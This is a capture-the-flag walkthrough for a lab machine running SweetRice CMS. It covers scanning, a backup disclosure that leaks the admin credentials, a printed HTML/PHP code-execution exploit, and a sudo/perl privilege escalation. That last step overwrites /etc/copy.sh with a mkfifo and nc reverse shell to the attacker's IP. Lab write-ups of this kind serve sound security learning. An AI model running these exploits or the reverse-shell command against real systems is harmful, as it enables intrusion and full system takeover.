<img width="637" height="358" alt="image" src="https://github.com/user-attachments/assets/83f8c877-74c5-4dd5-81f7-b63280506654" />

> Have some fun! There might be multiple ways to get user access.

## Scanning

first I scan the network of the machine to find the port and service on the network of this machine

```
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)  
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)  
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Apache2 Ubuntu Default Page: It works  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

here I found that only ssh and http port that opened in this machine, so I assume that this machine is a web vulnerability based to retrieve the flag.

as I visited the web page it appears that the page is Apache 2 default page, the next step I will scan for the hidden directory in this machine, to do that we will use the dirsearch.

```
[13:15:49] 301 -  316B  - /content  ->  http://10.201.13.110/content/  
[13:15:50] 200 -  985B  - /content/
```
found one hidden directory called /content that this page is using the SweetRice cms.

## Vulnerability Analysis

Now, searching for available vulnerability in the internet, and found the Backup Disclosure for the mysql backup vulnerability in SweetRice

```
 https://sploitus.com/exploit?id=PACKETSTORM:139585  
Title: SweetRice 1.5.1 - Backup Disclosure  
Application: SweetRice  
Versions Affected: 1.5.1  
Vendor URL: http://www.basic-cms.org/  
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip  
Discovered by: Ashiyane Digital Security Team  
Tested on: Windows 10  
Bugs: Backup Disclosure  
Date: 16-Sept-2016  
  
```
  
Proof of Concept :  
  
You can access to all mysql backup and download them from this directory.  
http://localhost/inc/mysql_backup  
  
and can access to website files backup from:  
http://localhost/SweetRice-transfer.zip

as I downloaded the mysql backup I found the creds for the admin login in this cms, but have to crack the hash for the password

```
INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"REDACTED\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"
```
## Gaining The Shell

this cms is also vulnerable to Code Execution as we also found that exploit for SweetRice cms

```
<html>  
<body onload="document.exploit.submit();">  
<form action="http://localhost/sweetrice/as/?type=ad&mode=save"  
method="POST" name="exploit">  
<input type="hidden" name="adk" value="hacked"/>  
<textarea type="hidden" name="adv">  
<?php  
echo '<h1> Hacked </h1>';  
phpinfo();?>  
</textarea>  
</form>  
</body>  
</html>  
  
<!--  
# After HTML File Executed You Can Access Page In  
http://localhost/sweetrice/inc/ads/hacked.php  
-->
```

I modified the php part to the reverse shell by PentestMonkey to retrieve the flag from my machine

```
$ cat /home/itguy/user.txt  
THM{******************************}
```
## Privilege Escalation

checking sudo privilege

```
www-data@THM-Chal:/home/itguy$ sudo -l  
sudo -l  
Matching Defaults entries for www-data on THM-Chal:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on THM-Chal:  
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`/usr/bin/perl` could access the root privileges using sudo and the other program is `/home/itguy/backup.pl` but not writable which mean I cannot modify these files. inside the backup.pl files is executing the `/etc/copy.sh`

```
www-data@THM-Chal:/home/itguy$ cat backup.pl  
cat backup.pl  
#!/usr/bin/perl  
  
system("sh", "/etc/copy.sh");
```

this is a script that lies in `/etc/copy.sh`

```
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh  
cat /etc/copy.sh  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

here I could modify the nc command replace the ip and port to my local machine

```
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.161.109 4444 > /tmp/f" > /etc/copy.sh
```

as I modified the script we can prepare the listener in my local machine

```
$ nc -lnvp 4444
```

and run the `/home/itguy/backup.pl` to spawn the shell in local machine

```
$ nc -lnvp 4444  
Listening on 0.0.0.0 4444  
Connection received on 10.201.111.0 51058  
# id  
uid=0(root) gid=0(root) groups=0(root)
```

retrieve the root flag

```
# cat /root/root.txt  
THM{********************************}
```


